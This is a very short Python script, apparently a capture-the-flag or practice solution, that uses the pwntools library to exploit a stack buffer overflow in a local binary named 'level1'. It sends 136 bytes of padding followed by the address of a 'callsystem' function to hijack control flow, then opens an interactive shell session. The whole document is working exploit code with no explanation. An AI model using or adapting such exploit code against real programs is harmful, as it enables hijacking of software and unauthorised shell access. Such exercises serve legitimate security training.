from pwn import *
callsystem_addr = 0x4005b6 
p = process('./level1')
payload = 'A'*136 + p64(callsystem_addr)
p.sendline(payload)
p.interactive()
